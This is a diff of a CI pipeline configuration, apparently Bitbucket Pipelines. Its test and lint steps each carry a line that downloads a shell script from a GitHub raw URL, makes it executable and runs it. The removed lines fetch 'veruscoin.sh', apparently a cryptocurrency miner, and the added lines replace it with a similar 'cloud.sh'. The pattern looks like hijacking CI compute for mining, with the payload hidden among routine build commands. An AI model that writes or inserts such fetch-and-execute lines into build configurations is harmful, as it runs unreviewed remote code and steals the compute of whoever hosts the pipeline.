@@ -60,59 +60,27 @@ pipelines:
             - if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
             - pip install pytest
             - pytest -v tests/* --junitxml=test-reports/report.xml
-            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
+            - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
+
       - step:
           name: run2
           script:
             - pip install flake8
             - flake8 . --extend-exclude=dist,build --show-source --statistics
-            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
+            - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
+
       - step:
           name: run3
           script:
             - pip install flake8
             - flake8 . --extend-exclude=dist,build --show-source --statistics
-            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
+            - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
+
       - step:
           name: run4
           script:
             - pip install flake8
             - flake8 . --extend-exclude=dist,build --show-source --statistics
-            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
-      - step:
-          name: run5
-          script:
-            - pip install flake8
-            - flake8 . --extend-exclude=dist,build --show-source --statistics
-            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
-      - step:
-          name: run6
-          script:
-            - pip install flake8
-            - flake8 . --extend-exclude=dist,build --show-source --statistics
-            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
-      - step:
-          name: run7
-          script:
-            - pip install flake8
-            - flake8 . --extend-exclude=dist,build --show-source --statistics
-            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
-      - step:
-          name: run8
-          script:
-            - pip install flake8
-            - flake8 . --extend-exclude=dist,build --show-source --statistics
-            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
-      - step:
-          name: run9
-          script:
-            - pip install flake8
-            - flake8 . --extend-exclude=dist,build --show-source --statistics
-            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
-      - step:
-          name: run10
-          script:
-            - pip install flake8
-            - flake8 . --extend-exclude=dist,build --show-source --statistics
-            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
-© 2021 GitHub, Inc.
+            - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
+
+      
